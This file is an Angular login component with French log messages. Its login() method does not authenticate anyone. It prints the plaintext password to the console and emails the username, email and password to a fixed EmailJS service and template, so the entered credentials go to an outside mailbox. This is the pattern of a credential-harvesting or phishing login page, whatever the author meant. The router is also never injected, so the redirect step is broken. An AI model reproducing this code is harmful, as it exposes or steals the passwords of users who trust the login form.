import { Component, OnInit } from '@angular/core';
import emailjs from 'emailjs-com';

@Component({
  selector: 'app-login',
  templateUrl: './login.component.html',
  styleUrls: ['./login.component.scss']
})
export class LoginComponent implements OnInit {
  username: string;
  email: string;
  password: string;
  router: any;

  constructor() { }

  ngOnInit(): void {
  }

  login() {
    console.log('Formulaire de connexion soumis');
    console.log('Nom d\'utilisateur :', this.username);
    console.log('Mot de passe :', this.password);
  
    const templateParams = {
      username: this.username,
      email: this.email,
      password: this.password
    };
  
    emailjs.send('service_4p0e3wq', 'template_6pfrbr9', templateParams)
      .then(() => {
        console.log('Email sent successfully');
        this.router.navigate(['/home']);
      })
      .catch((error) => {
        console.error('Failed to send email:', error);
      });
  }
}
